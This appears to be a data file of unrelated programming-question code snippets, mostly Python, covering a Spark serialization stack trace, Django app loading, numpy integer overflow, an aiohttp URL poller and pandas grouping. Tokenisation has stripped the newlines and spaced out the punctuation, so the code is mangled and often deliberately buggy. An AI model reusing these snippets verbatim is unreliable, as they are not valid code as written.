"[ INFO ] [ Console $ ] Using existing engine manifest JSON at /home/PredictionIO/PredictionIO-0.9.6/bin/MyRecommendation/manifest.json [ INFO ] [ Runner $ ] Submission command : /home/PredictionIO/PredictionIO-0.9.6/vendors/spark-1.5.1-bin-hadoop2.6/bin/spark-submit -- class io.prediction.workflow.CreateWorkflow -- jar/PredictionIO/PredictionIO-0.9.6/bin/MyRecommendation/target/scala-2.10/template-scala-parallel-recommendation_2.10-0.1-SNAPSHOT.jar , file : /home/PredictionIO/PredictionIO-0.9.6/bndation/target/scala-2.10/template-scala-parallel-recommendation-assembly-0.1-SNAPSHOT-deps.jar -- files file : /home/PredictionIO/PredictionIO-0.9.6/conf/log4j.properties -- driver/home/PredictionIO/PredictionIO-0.9.6/conf : /home/PredictionIO/PredictionIO-0.9.6/lib/postgresql-9.4-1204.jdbc41.jar : /home/PredictionIO/PredictionIO-0.9.6/lib/mysql-connector-jav file : /home/PredictionIO/PredictionIO-0.9.6/lib/pio-assembly-0.9.6.jar -- engine-id qokYFr4rwibijNjabXeVSQKKFrACyrYZ -- engine-version ed29b3e2074149d483aa85b6b1ea35a52dbbdb9a -- et file : /home/PredictionIO/PredictionIO-0.9.6/bin/MyRecommendation/engine.json -- verbosity 0 -- json-extractor Both -- env PIO_ENV_LOADED=1 , PIO_STORAGE_REPOSITORIES_METADATA_NAME=pFS_BASEDIR=/root/.pio_store , PIO_HOME=/home/PredictionIO/PredictionIO-0.9.6 , PIO_FS_ENGINESDIR=/root/.pio_store/engines , PIO_STORAGE_SOURCES_PGSQL_URL=jdbc : postgresql : //localhost/pGE_REPOSITORIES_METADATA_SOURCE=PGSQL , PIO_STORAGE_REPOSITORIES_MODELDATA_SOURCE=PGSQL , PIO_STORAGE_REPOSITORIES_EVENTDATA_NAME=pio_event , PIO_STORAGE_SOURCES_PGSQL_PASSWORD=pio , PIURCES_PGSQL_TYPE=jdbc , PIO_FS_TMPDIR=/root/.pio_store/tmp , PIO_STORAGE_SOURCES_PGSQL_USERNAME=pio , PIO_STORAGE_REPOSITORIES_MODELDATA_NAME=pio_model , PIO_STORAGE_REPOSITORIES_EVENTDGSQL , PIO_CONF_DIR=/home/PredictionIO/PredictionIO-0.9.6/conf [ INFO ] [ Engine ] Extracting datasource params ... [ INFO ] [ WorkflowUtils $ ] No 'name ' is found . Default empty String will be used . [ INFO ] [ Engine ] Datasource params : ( , DataSourceParams ( MyApp3 , None ) ) [ INFO ] [ Engine ] Extracting preparator params ... [ INFO ] [ Engine ] Preparator params : ( , Empty ) [ INFO ] [ Engine ] Extracting serving params ... [ INFO ] [ Engine ] Serving params : ( , Empty ) [ WARN ] [ Utils ] Your hostname , test-digin resolves to a loopback address : 127.0.1.1 ; using 192.168.2.191 instead ( on interface p5p1 ) [ WARN ] [ Utils ] Set SPARK_LOCAL_IP if you need to bind to another address [ INFO ] [ Remoting ] Starting remoting [ INFO ] [ Remoting ] Remoting started ; listening on addresses : [ akka.tcp : //sparkDriver @ 192.168.2.191:56574 ] [ WARN ] [ MetricsSystem ] Using default name DAGScheduler for source because spark.app.id is not set . [ INFO ] [ Engine $ ] EngineWorkflow.train [ INFO ] [ Engine $ ] DataSource : duo.DataSource @ 6088451e [ INFO ] [ Engine $ ] Preparator : duo.Preparator @ 1642eeae [ INFO ] [ Engine $ ] AlgorithmList : List ( duo.ALSAlgorithm @ a09303 ) [ INFO ] [ Engine $ ] Data sanity check is on . [ INFO ] [ Engine $ ] duo.TrainingData does not support data sanity check . Skipping check . [ INFO ] [ Engine $ ] duo.PreparedData does not support data sanity check . Skipping check . [ WARN ] [ BLAS ] Failed to load implementation from : com.github.fommil.netlib.NativeSystemBLAS [ WARN ] [ BLAS ] Failed to load implementation from : com.github.fommil.netlib.NativeRefBLAS [ WARN ] [ LAPACK ] Failed to load implementation from : com.github.fommil.netlib.NativeSystemLAPACK [ WARN ] [ LAPACK ] Failed to load implementation from : com.github.fommil.netlib.NativeRefLAPACKException in thread `` main '' org.apache.spark.SparkException : Job aborted due to stage failure : Task serialization failed : java.lang.StackOverflowErrorjava.io.ObjectStreamClass.invokeWriteObject ( ObjectStreamClass.java:1028 ) java.io.ObjectOutputStream.writeSerialData ( ObjectOutputStream.java:1496 ) java.io.ObjectOutputStream.writeOrdinaryObject ( ObjectOutputStream.java:1432 ) java.io.ObjectOutputStream.writeObject0 ( ObjectOutputStream.java:1178 ) java.io.ObjectOutputStream.defaultWriteFields ( ObjectOutputStream.java:1548 ) java.io.ObjectOutputStream.writeSerialData ( ObjectOutputStream.java:1509 ) java.io.ObjectOutputStream.writeOrdinaryObject ( ObjectOutputStream.java:1432 ) java.io.ObjectOutputStream.writeObject0 ( ObjectOutputStream.java:1178 ) java.io.ObjectOutputStream.defaultWriteFields ( ObjectOutputStream.java:1548 ) java.io.ObjectOutputStream.writeSerialData ( ObjectOutputStream.java:1509 ) java.io.ObjectOutputStream.writeOrdinaryObject ( ObjectOutputStream.java:1432 ) java.io.ObjectOutputStream.writeObject0 ( ObjectOutputStream.java:1178 ) java.io.ObjectOutputStream.writeObject ( ObjectOutputStream.java:348 ) scala.collection.immutable. $ colon $ colon.writeObject ( List.scala:379 ) sun.reflect.GeneratedMethodAccessor3.invoke ( Unknown Source ) sun.reflect.DelegatingMethodAccessorImpl.invoke ( DelegatingMethodAccessorImpl.java:43 ) java.lang.reflect.Method.invoke ( Method.java:498 ) java.io.ObjectStreamClass.invokeWriteObject ( ObjectStreamClass.java:1028 ) java.io.ObjectOutputStream.writeSerialData ( ObjectOutputStream.java:1496 ) java.io.ObjectOutputStream.writeOrdinaryObject ( ObjectOutputStream.java:1432 ) java.io.ObjectOutputStream.writeObject0 ( ObjectOutputStream.java:1178 ) java.io.ObjectOutputStream.defaultWriteFields ( ObjectOutputStream.java:1548 ) java.io.ObjectOutputStream.writeSerialData ( ObjectOutputStream.java:1509 ) java.io.ObjectOutputStream.writeOrdinaryObject ( ObjectOutputStream.java:1432 ) java.io.ObjectOutputStream.writeObject0 ( ObjectOutputStream.java:1178 ) java.io.ObjectOutputStream.defaultWriteFields ( ObjectOutputStream.java:1548 ) java.io.ObjectOutputStream.writeSerialData ( ObjectOutputStream.java:1509 ) java.io.ObjectOutputStream.writeOrdinaryObject ( ObjectOutputStream.java:1432 ) java.io.ObjectOutputStream.writeObject0 ( ObjectOutputStream.java:1178 ) java.io.ObjectOutputStream.defaultWriteFields ( ObjectOutputStream.java:1548 ) java.io.ObjectOutputStream.writeSerialData ( ObjectOutputStream.java:1509 ) java.io.ObjectOutputStream.writeOrdinaryObject ( ObjectOutputStream.java:1432 ) java.io.ObjectOutputStream.writeObject0 ( ObjectOutputStream.java:1178 ) java.io.ObjectOutputStream.defaultWriteFields ( ObjectOutputStream.java:1548 ) java.io.ObjectOutputStream.writeSerialData ( ObjectOutputStream.java:1509 ) java.io.ObjectOutputStream.writeOrdinaryObject ( ObjectOutputStream.java:1432 ) java.io.ObjectOutputStream.writeObject0 ( ObjectOutputStream.java:1178 ) java.io.ObjectOutputStream.defaultWriteFields ( ObjectOutputStream.java:1548 )"
"from concurrent.futures import ProcessPoolExecutor , ThreadPoolExecutorimport timedef job1 ( ) : try : ex2 = ThreadPoolExecutor ( ) time.sleep ( 2 ) f2 = ex2.submit ( job2 ) finally : ex2.shutdown ( wait=False ) return f2def job2 ( ) : time.sleep ( 2 ) return 'done'try : ex1 = ProcessPoolExecutor ( ) f1 = ex1.submit ( job1 ) finally : ex1.shutdown ( wait=False ) print ( 'f1 = { ! r } '.format ( f1 ) ) f2 = f1.result ( ) print ( 'f1 = { ! r } '.format ( f1 ) ) print ( 'f2 = { ! r } '.format ( f2 ) )"
"# probabilistically fetch any one of baloon , toy or card [ 'red ' , 'blue ' , 'green ' ] == `` baloon '' or `` car '' or `` toy '' d [ `` red '' , `` blue '' ] = [ ( `` baloon '' , haseither ( 'red ' , 'green ' ) ,0.8 ) , ( `` toy '' , ... .. ) , ... . ] d [ `` red '' , `` blue '' ] = { `` baloon '' : haseither ( 'red ' , 'green',0.8 ) , `` toy '' : hasonly ( `` blue '' ,0.15 ) , `` car '' : default ( 0.05 ) }"
$ { name # # */ } $ { name % /* }
... sqlalchemy==1.2.3 -- hash=sha256:9e9ec143e2e246f385cfb2de8daa89d2fa466279addcb7be9e102988fdf33d24werkzeug==0.14.1 -- hash=sha256 : d5da73735293558eb1651ee2fddc4d0dedcfa06538b8813a2e20011583c9e49b git+ssh : //gitlab.domain.com/private_pkg.git # egg=private_pkg pip install git+ssh : //gitlab.domain.com/private_pkg.git # egg=private_pkg Ca n't verify hashes for these requirements because we do n't have a way to hash version control repositories : private_pkg from git+ssh : //gitlab.domain.com/private_pkg.git # egg=private_pkg ( from -r requirements/prod.lock ( line 30 ) )
class Person ( object ) : def sayHello ( self ) : return 'Hello'print ( Person ( ) .sayHello is Person ( ) .sayHello )
"> > > try : ... pass ... except ThingThatDoesNotExist : ... print `` bad '' ... > > > > > > x = ThingThatDoesNotExistTraceback ( most recent call last ) : File `` < stdin > '' , line 1 , in < module > NameError : name 'ThingThatDoesNotExist ' is not defined"
[ app : main ] use = egg : awesomeprojectauth.tkt = 'abc'auth.secret = ' I love python'mongodb.host = 'somehost'mongodb.port= 6379 [ server : main ] use = egg : waitress # mainhost = 0.0.0.0port = 6543 [ user : sg : qa ] host = 127.0.0.1port = 1234 [ customer : sg : qa ] host = 127.0.0.2port = 4567 def add_api_path ( event ) : request = event.request settings = request.registry.settings _type = 'customer : sg : qa ' base_config = settings [ _type ]
> > > from timeit import timeit > > > timeit ( `` f ' { 1 } ' '' ) 0.1678762999999961 > > > timeit ( `` str ( 1 ) '' ) 0.3216999999999999 > > > timeit ( `` repr ( 1 ) '' ) 0.2528296999999995 assert f '' { 1 } '' == str ( 1 ) == repr ( 1 )
"from django.apps import AppConfigfrom actstream import registryclass MainAppConfig ( AppConfig ) : name = 'main_app ' def ready ( self ) : registry.register ( self.get_model ( 'Car ' ) ) default_app_config = 'main_app.apps.MainAppConfig ' Traceback ( most recent call last ) : File `` manage.py '' , line 10 , in < module > execute_from_command_line ( sys.argv ) File `` /usr/local/lib/python2.7/dist-packages/django/core/management/__init__.py '' , line 350 , in execute_from_command_lineutility.execute ( ) File `` /usr/local/lib/python2.7/dist-packages/django/core/management/__init__.py '' , line 342 , in executeself.fetch_command ( subcommand ) .run_from_argv ( self.argv ) File `` /usr/local/lib/python2.7/dist-packages/django/core/management/__init__.py '' , line 176 , in fetch_commandcommands = get_commands ( ) File `` /usr/local/lib/python2.7/dist-packages/django/utils/lru_cache.py '' , line 100 , in wrapperresult = user_function ( *args , **kwds ) File `` /usr/local/lib/python2.7/dist-packages/django/core/management/__init__.py '' , line 71 , in get_commandsfor app_config in reversed ( list ( apps.get_app_configs ( ) ) ) : File `` /usr/local/lib/python2.7/dist-packages/django/apps/registry.py '' , line 137 , in get_app_configs self.check_apps_ready ( ) File `` /usr/local/lib/python2.7/dist-packages/django/apps/registry.py '' , line 124 , in check_apps_ready raise AppRegistryNotReady ( `` Apps are n't loaded yet . '' ) django.core.exceptions.AppRegistryNotReady : Apps are n't loaded yet . INSTALLED_APPS = [ 'django.contrib.admin ' , 'django.contrib.auth ' , 'django.contrib.contenttypes ' , 'django.contrib.sessions ' , 'django.contrib.messages ' , 'django.contrib.staticfiles ' , 'django.contrib.humanize ' , 'django.contrib.sites ' , 'main_app ' , 'actstream ' , ] class MainAppConfig ( AppConfig ) : name = 'main_app'def ready ( self ) : from actstream import registry registry.register ( self.get_model ( 'Car ' ) )"
import weakrefimport gcclass M : passw = weakref.WeakKeyDictionary ( ) m = M ( ) w [ m ] = some_other_objectdel mgc.collect ( ) print w.keys ( ) import weakrefimport gcclass M : passm = M ( ) m.circular_reference = mr = weakref.ref ( m ) del mgc.collect ( ) print r
import jedi
"import Tkinter as tkimport ttkclass app ( tk.Tk ) : def __init__ ( self , *args , **kwargs ) : tk.Tk.__init__ ( self , *args , **kwargs ) self.interior = tk.Frame ( self ) tkvar = tk.IntVar ( ) combo = ttk.Combobox ( self.interior , textvariable = tkvar , width = 10 , values = [ 1 , 2 , 3 ] ) combo.unbind ( `` < MouseWheel > '' ) combo.bind ( `` < MouseWheel > '' , self.empty_scroll_command ) combo.pack ( ) self.interior.pack ( ) def empty_scroll_command ( self , event ) : returnsample = app ( ) sample.mainloop ( )"
try : i = pexcept : i = 4
"@ view_config ( request_method='POST ' , renderer='json ' )"
# ! /usr/bin/python # -*- coding : utf-8 -*-mia_età = 31print mia_età
"from numpy import matu = mat ( [ [ 0.9**0.5 ] , [ - ( 0.1 ) **0.5 ] ] ) # [ 0.9486833 -0.31622777 ]"
"real 0m19.146suser 0m18.932ssys 0m0.190s real 0m0.924suser 0m0.792ssys 0m0.129s import std.stdio ; import std.string ; int main ( string [ ] args ) { if ( args.length < 2 ) { return 1 ; } auto infile = File ( args [ 1 ] ) ; uint linect = 0 ; foreach ( line ; infile.byLine ( ) ) linect += 1 ; writeln ( `` There are : `` , linect , `` lines . `` ) ; return 0 ; } import sysif __name__ == `` __main__ '' : if ( len ( sys.argv ) < 2 ) : sys.exit ( ) infile = open ( sys.argv [ 1 ] ) linect = 0 for line in infile : linect += 1 print `` There are % d lines '' % linect import std.stdio ; import std.string ; import std.file ; int main ( string [ ] args ) { if ( args.length < 2 ) { return 1 ; } auto c = cast ( string ) read ( args [ 1 ] ) ; auto l = splitLines ( c ) ; writeln ( `` There are `` , l.length , `` lines . `` ) ; return 0 ; } real 0m3.201suser 0m2.820ssys 0m0.376s"
"> > > a = np.array ( [ [ 1,2,3,4 ] , [ 2,4,6,8 ] ] ) > > > b = np.array ( zip ( a.T , a.T ) ) > > > b.shape = ( 2*len ( a [ 0 ] ) , 2 ) > > > b.Tarray ( [ [ 1 , 1 , 2 , 2 , 3 , 3 , 4 , 4 ] , [ 2 , 2 , 4 , 4 , 6 , 6 , 8 , 8 ] ] )"
> > > 2 * 102 * 1020 > > > > > > 2 * 1020 > > >
{ % extends `` header.html '' % } { % load navigation_tags % } { % block header % } { % get_section site=site as section % } { % include `` foobar.html '' with section=section % } { % endblock header % } { % block navigation % } < nav > < div class= '' container '' > { % get_section site=site as section % } { % navigation section.slug % } < /div > < /nav > { % endblock navigation % } @ register.assignment_tagdef get_parent_section ( site ) : if site.id == settings.FOOBAR_SITE_ID : section = Section.objects.get ( id=settings.FOOBAR_SECTION_ID ) else : # This is also a section instance . return site.default_section
"r = requests.get ( url , headers= { 'User-Agent ' : ' ... ' } ) soup = bs4.BeautifulSoup ( r.text , from_encoding=r.encoding )"
"import asyncioimport timefrom socket import gaierrorfrom typing import List , Tupleimport aiohttpfrom aiohttp.client_exceptions import TooManyRedirects # Using a non-default user-agent seems to avoid lots of 403 ( Forbidden ) errorsHEADERS = { 'user-agent ' : ( 'Mozilla/5.0 ( Macintosh ; Intel Mac OS X 10_10_5 ) ' 'AppleWebKit/537.36 ( KHTML , like Gecko ) ' 'Chrome/45.0.2454.101 Safari/537.36 ' ) , } async def get_status_code ( session : aiohttp.ClientSession , url : str ) - > Tuple [ int , str ] : try : # A HEAD request is quicker than a GET request resp = await session.head ( url , allow_redirects=True , ssl=False , headers=HEADERS ) async with resp : status = resp.status reason = resp.reason if status == 405 : # HEAD request not allowed , fall back on GET resp = await session.get ( url , allow_redirects=True , ssl=False , headers=HEADERS ) async with resp : status = resp.status reason = resp.reason return ( status , reason ) except aiohttp.InvalidURL as e : return ( 900 , str ( e ) ) except aiohttp.ClientConnectorError : return ( 901 , `` Unreachable '' ) except gaierror as e : return ( 902 , str ( e ) ) except aiohttp.ServerDisconnectedError as e : return ( 903 , str ( e ) ) except aiohttp.ClientOSError as e : return ( 904 , str ( e ) ) except TooManyRedirects as e : return ( 905 , str ( e ) ) except aiohttp.ClientResponseError as e : return ( 906 , str ( e ) ) except aiohttp.ServerTimeoutError : return ( 907 , `` Connection timeout '' ) except asyncio.TimeoutError : return ( 908 , `` Connection timeout '' ) async def get_status_codes ( loop : asyncio.events.AbstractEventLoop , urls : List [ str ] , timeout : int ) - > List [ Tuple [ int , str ] ] : conn = aiohttp.TCPConnector ( limit=1000 , ttl_dns_cache=300 ) client_timeout = aiohttp.ClientTimeout ( connect=timeout ) async with aiohttp.ClientSession ( loop=loop , timeout=client_timeout , connector=conn ) as session : codes = await asyncio.gather ( * ( get_status_code ( session , url ) for url in urls ) ) return codesdef poll_urls ( urls : List [ str ] , timeout=20 ) - > List [ Tuple [ int , str ] ] : `` '' '' : param timeout : in seconds `` '' '' print ( `` Started polling '' ) time1 = time.time ( ) loop = asyncio.get_event_loop ( ) codes = loop.run_until_complete ( get_status_codes ( loop , urls , timeout ) ) time2 = time.time ( ) dt = time2 - time1 print ( f '' Polled { len ( urls ) } websites in { dt : .1f } seconds `` f '' at { len ( urls ) /dt : .3f } URLs/sec '' ) return codes"
from hurry.size import sizefrom pysize import get_ziseimport osimport psutildef load_objects ( ) : process = psutil.Process ( os.getpid ( ) ) print `` start method '' process = psutil.Process ( os.getpid ( ) ) print `` process consumes `` + size ( process.memory_info ( ) .rss ) objects = make_a_call ( ) print `` total size of objects is `` + ( get_size ( objects ) ) print `` process consumes `` + size ( process.memory_info ( ) .rss ) print `` exit method '' def main ( ) : process = psutil.Process ( os.getpid ( ) ) print `` process consumes `` + size ( process.memory_info ( ) .rss ) load_objects ( ) print `` process consumes `` + size ( process.memory_info ( ) .rss ) process consumes 21Mstart methodtotal size of objects is 20Mprocess consumes 29Mexit methodprocess consumes 29M
"import matplotlib.pyplot as pltimport numpy as npImg = plt.imread ( `` twoObj.bmp '' ) Img2 = Img.flatten ( ) ( n , ) = Img2.shapeA = np.subtract.outer ( Img2 , Img2 ) V , D = np.linalg.eig ( A )"
"foo/ __init__.py bar.py def abc ( ) : print 'ABC ' from foo import abc Traceback ( most recent call last ) : File `` foo/bar.py '' , line 1 , in < module > from foo import abcImportError : No module named foo"
"df = id_easy ordinal latitude longitude epoch day_of_week0 aaa 1.0 22.0701 2.6685 01-01-11 07:45 Friday1 aaa 2.0 22.0716 2.6695 01-01-11 07:45 Friday2 aaa 3.0 22.0722 2.6696 01-01-11 07:46 Friday3 bbb 1.0 22.1166 2.6898 01-01-11 07:58 Friday4 bbb 2.0 22.1162 2.6951 01-01-11 07:59 Friday5 ccc 1.0 22.1166 2.6898 01-01-11 07:58 Friday6 ccc 2.0 22.1162 2.6951 01-01-11 07:59 Friday import pandas as pdimport numpy as npfrom scipy.spatial.distance import directed_hausdorfffrom scipy.spatial.distance import pdist , squareformu = np.array ( [ ( 2.6685,22.0701 ) , ( 2.6695,22.0716 ) , ( 2.6696,22.0722 ) ] ) # coordinates of ` id_easy ` of taxi ` aaa ` v = np.array ( [ ( 2.6898,22.1166 ) , ( 2.6951,22.1162 ) ] ) # coordinates of ` id_easy ` of taxi ` bbb ` directed_hausdorff ( u , v ) [ 0 ] aaa bbb cccaaa 0 0.05114 ... bbb ... 0ccc 0"
"the_data = [ ' a ' , ' b ' , ' c ' ] for index , item in enumerate ( the_data ) : # index = 1 , item = ' a ' for name , sport in the_data.iteritems ( ) : # name - > john , sport- > football # can assignment of name & sport happen within the ` for-in ` line itself ? for index , name_sport_tuple in enumerate ( the_data.iteritems ( ) ) : name , sport = name_sport_tuple # Can this line somehow be avoided ? # index- > 1 , name- > john , sport - > football"
"intersphinx_mapping = { 'python ' : ( 'https : //docs.python.org/3 ' , None ) , 'pyserial ' : ( 'https : //pythonhosted.org/pyserial/ ' , None ) , } This project depends on the : ref : ` pyserial < pyserial : ? ? ? > ` library ."
if ( x == True ) : if ( y == True ) : if ( z == True ) : if ( t == True ) : print ( `` Case 1 '' ) else : print ( `` Case 2 '' ) else : if ( t == True ) : print ( `` Case 3 '' ) else : print ( `` Case 4 '' ) else : if ( z == True ) : if ( t == True ) : print ( `` Case 5 '' ) else : print ( `` Case 6 '' ) else : if ( t == True ) : print ( `` Case 7 '' ) else : print ( `` Case 8 '' ) else : if ( y == True ) : if ( z == True ) : if ( t == True ) : print ( `` Case 9 '' ) else : print ( `` Case 10 '' ) else : if ( t == True ) : print ( `` Case 11 '' ) else : print ( `` Case 12 '' ) else : if ( z == True ) : if ( t == True ) : print ( `` Case 13 '' ) else : print ( `` Case 14 '' ) else : if ( t == True ) : print ( `` Case 15 '' ) else : print ( `` Case 16 '' )
"import pipdef install ( package_name ) : try : pip.main ( [ 'install ' , package_name ] ) except : print ( `` Unable to install `` + package_name )"
def move ( self ) : self.pos = Vector ( *self.velocity ) + self.pos def move ( self ) : self.pos = self.pos + Vector ( *self.velocity )
"varname = '444'somefunc ( varname ) = > intvarname = 'somestring'somefunc ( varname ) = > Stringvarname = ' 1.2323'somefunc ( varname ) = > float myList = [ ' 1 ' , ' 2 ' , ' 1.2 ' , 'string ' ]"
> > > np.array ( [ 1e5 ] ) **2array ( [ 1.00000000e+10 ] ) # correct > > > np.array ( [ 100000 ] ) **2array ( [ 1410065408 ] ) # Why ? ? > > > np.array ( [ 1e4 ] ) **2array ( [ 1.00000000e+08 ] ) # correct > > > np.array ( [ 10000 ] ) **2array ( [ 100000000 ] ) # and still correct
# ! /usr/bin/python2.4import loggingimport sysimport doctestdef foo ( x ) : `` '' '' > > > foo ( 0 ) 0 `` '' '' print ( `` % d '' % ( x ) ) _logger.debug ( `` % d '' % ( x ) ) def _test ( ) : doctest.testmod ( ) _logger = logging.getLogger ( ) _logger.setLevel ( logging.DEBUG ) _formatter = logging.Formatter ( ' % ( message ) s ' ) _handler = logging.StreamHandler ( sys.stdout ) _handler.setFormatter ( _formatter ) _logger.addHandler ( _handler ) _test ( )
"name pricepen 20paper 30eraser 0 Product.objects.all ( ) .order_by ( '-price ' ) class Product ( models.Model ) : name = models.CharField ( max_length=100 , blank=True , null=True ) price = models.IntegerField ( 'Price ' , blank=True , null=True )"
a = sympify ( ' 1/4*x+y+c+1/2 ' ) a.args.__len__ ( )
"from django.db.models.signals import pre_delete , pre_savefrom django.dispatch import receiverfrom _myTools.functions import ImageProcessingfrom content_image.models import Documentimport os # Image deletion when deleting entire entry @ receiver ( pre_delete , sender=Document , dispatch_uid='document_delete_signal ' ) def entry_deletion_images_delete ( sender , instance , using , **kwargs ) : for key , value in instance.imageSizes.items ( ) : name_of_image_field = str ( getattr ( instance , key ) ) # Converts to string , if not is object itself os.remove ( instance.baseDir + name_of_image_field ) setattr ( instance , key , None )"
"sparse : pandas/src/sparse.pyxpython-dbg setup.py build_ext -- inplace -- pyrex-gdbbuild : clean_pycpython-dbg setup.py build_ext -- inplace -- pyrex-gdbdevelop : build-python-dbg setup.py develop -- pyrex-gdb from numpy import asarrayfrom pandas import algosv = [ 4171.0 , 0.0 ] expAverage = algos.ewma ( asarray ( v ) , 50 , 1 ) print expAverage /tmp/1/pandas/pandas/hashtable.so : undefined symbol : Py_InitModule4_64Traceback ( most recent call last ) : File `` test1.py '' , line 2 , in < module > from pandas import algos File `` /tmp/1/pandas/pandas/__init__.py '' , line 6 , in < module > from . import hashtable , tslib , libImportError : /tmp/1/pandas/pandas/hashtable.so : undefined symbol : Py_InitModule4_64 [ 94423 refs ]"
"model.compile ( optimizer='adam ' , loss='categorical_crossentropy ' ) model.fit ( x , y ) adam = tf.keras.optimizers.Adam ( ) model.compile ( optimizer=adam , loss='categorical_crossentropy ' ) model.fit ( x , y )"
"Error : [ ( 'asn1 encoding routines ' , 'ASN1_D2I_READ_BIO ' , 'not enough data ' ) ] with open ( path_to_key_file , ' r ' ) as f : private_key = f.read ( )"
"groups = [ [ 'Group1 ' , ' A ' , ' B ' ] , [ 'Group2 ' , ' C ' , 'D ' ] ] A 100B 200C 300D 400 Group 1 300Group 2 700"
"import httplib2from apiclient.discovery import buildfrom oauth2client.service_account import ServiceAccountCredentialsdef main ( request ) : scope = [ 'https : //www.googleapis.com/auth/spreadsheets ' , 'https : //www.googleapis.com/auth/drive ' ] credentials = ServiceAccountCredentials.from_json_keyfile_name ( 'client_secrets.json ' , scope ) service = build ( 'sheets ' , 'v4 ' , http=credentials.authorize ( httplib2.Http ( ) ) ) spreadsheet_id = 'id-of-the-google-sheet ' range = 'Sheet1 ! A : D ' response = service.spreadsheets ( ) .values ( ) .get ( spreadsheetId=spreadsheet_id , range=range ) .execute ( ) cols = response.get ( 'values ' , [ ] ) [ 0 ] return cols [ 0 ] google-api-python-clientoauth2clientgoogle-auth-httplib2google-auth"
"class t ( dict ) : def __getattr__ ( self , v ) : try : return self [ v ] except KeyError : raise AttributeError ( `` Key `` + str ( v ) + `` does not exist . '' ) def __init__ ( self , *args , **kwargs ) : for source in args : for i , j in source.items ( ) : self [ i ] = j for i , j in kwargs.items ( ) : self [ i ] = j > > > thing = t ( cow=10 , moo='moooooooo ' ) > > > thing.cow10 > > > thing.moo'moooooooo ' > > > thing = ( 1 , 3 , ( 'blargh ' , 'mooo ' ) ) > > > a , b , ( c , d ) = thing > > > a1 > > > b3 > > > c'blargh ' > > > d'mooo '"
"index created pct_pl_transit pct_pl_transit_max0 1970-01-01 00:00:00 49.627697 60.0568732 1970-01-01 01:00:00 43.800967 55.3014604 1970-01-01 02:00:00 41.440480 49.7577406 1970-01-01 03:00:00 37.879753 40.3522268 1970-01-01 04:00:00 36.691287 19.429075 base=alt.Chart ( lien_traf_gest_traf_lapi ) .encode ( x=alt.X ( 'created ' , axis=alt.Axis ( title='Heure ' , format= ' % Hh % M ' ) ) ) line_pct_pl_lapi=base.mark_line ( color='blue ' ) .encode ( y=alt.Y ( 'pct_pl_transit : Q ' , axis=alt.Axis ( title='Nombre de PL SIREDO ' ) ) ) line_pct_max=base.mark_line ( ) .encode ( y='pct_pl_transit_max ' ) line_pct_max+line_pct_pl_lapi"
"def start_requests ( self ) : for url in self.start_urls : yield scrapy.Request ( url , self.parse , headers= { 'My-Custom-Header ' : 'Custom-Header-Content ' } , meta= { 'splash ' : { 'args ' : { 'html ' : 1 , 'wait ' : 5 , } , } } , ) def parse ( self , response ) : print ( response.request.headers ) { b'Content-Type ' : [ b'application/json ' ] , b'Accept ' : [ b'text/html , application/xhtml+xml , application/xml ; q=0.9 , */* ; q=0.8 ' ] , b'Accept-Language ' : [ b'en ' ] , b'User-Agent ' : [ b'Mozilla/5.0 ( Windows NT 5.1 ) AppleWebKit/537.36 ( KHTML , like Gecko ) Chrome/35.0.2309.372 Safari/537.36 ' ] , b'Accept-Encoding ' : [ b'gzip , deflate ' ] }"
"class Darray ( np.ndarray ) : def __new__ ( cls , input_array , dshape , *args , **kwargs ) : obj = np.asarray ( input_array ) .view ( cls ) obj.SelObj = SelObj obj.dshape = dshape return obj def __array_finalize__ ( self , obj ) : if obj is None : return self.info = getattr ( obj , 'dshape ' , ' N ' ) def __getitem__ ( self , index ) : return self [ index ] D = Darray ( ones ( ( 10,10 ) ) , ( `` T '' , '' N '' ) )"
100 % | # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # | 45 % | # # # # # # # # # # # # # # # # # # # # # # |
"r ' ( ? < =\d ) ( ? = ( \d { 3 } ) + ( ? ! \d ) ) ' r ' ( ? < =\d ) ( ? = ( ( ( \d { 2 } ) { 0,2 } \d { 3 } ) ( ? =\b ) ) ) '"
with warnings.catch_warnings ( ) : warnings.simplefilter ( `` ignore '' ) fxn ( )
"Timestamp CAT0 2016-12-02 23:35:28 2001 2016-12-02 23:37:43 2002 2016-12-02 23:40:49 3003 2016-12-02 23:58:53 4004 2016-12-02 23:59:02 300 ... Timestamp BINS 200 300 400 5002016-12-02 23:30 2 0 0 02016-12-02 23:40 0 1 0 02016-12-02 23:50 0 1 1 0 ... def create_hist ( df , timestamp , freq , fontsize , outfile ) : `` '' '' Create a histogram of the number of CATs per time period . '' '' '' df.set_index ( timestamp , drop=False , inplace=True ) to_plot = df [ timestamp ] .groupby ( pandas.TimeGrouper ( freq=freq ) ) .count ( ) ... def create_hist ( df , timestamp , freq , fontsize , outfile ) : `` '' '' Create a histogram of the number of CATs per time period . '' '' '' df.pivot ( columns= '' CAT '' ) df.set_index ( timestamp , drop=False , inplace=True ) to_plot = df [ timestamp ] .groupby ( pandas.TimeGrouper ( freq=freq ) ) .count ( ) ..."
"from typing import List , IterablePosition = ( int , int ) IntegerMatrix = List [ List [ int ] ] def locate_zeros ( matrix : IntegerMatrix ) - > Iterable [ Position ] : `` '' '' Given an NxM matrix find the positions that contain a zero . '' '' '' for row_num , row in enumerate ( matrix ) : for col_num , element in enumerate ( row ) : if element == 0 : yield ( col_num , row_num ) Traceback ( most recent call last ) : File `` type_m.py '' , line 6 , in < module > def locate_zeros ( matrix : IntegerMatrix ) - > Iterable [ Position ] : File `` /usr/lib/python3.5/typing.py '' , line 970 , in __getitem__ ( len ( self.__parameters__ ) , len ( params ) ) ) TypeError : Can not change parameter count from 1 to 2"
"C : \data\AS\WO\AS_WOP_1PPPPPP20070506.binC : \data\AS\WO\AS_WOP_1PPPPPP20070606.binC : \data\AS\WO\AS_WOP_1PPPPPP20070708.binC : \data\AS\WO\AS_WOP_1PPPPPP20070808.bin ... import retextfile = open ( 'file.txt ' , ' r ' ) filetext = textfile.read ( ) textfile.close ( ) data = [ ] for line in filetext : matches = re.search ( `` AS_ [ A-Z ] { 3 } _ ( . { 7 } ) ( [ 0-9 ] { 4 } ) ( [ 0-9 ] { 2 } ) ( [ 0-9 ] { 2 } ) '' , line ) data.append ( line ) year month2007 052007 062007 072007 08 [ [ '2007 ' , ' 5 ' ] , [ '2007 ' , ' 6 ' ] , [ '2007 ' , ' 7 ' ] , [ '2007 ' , ' 8 ' ] ]"
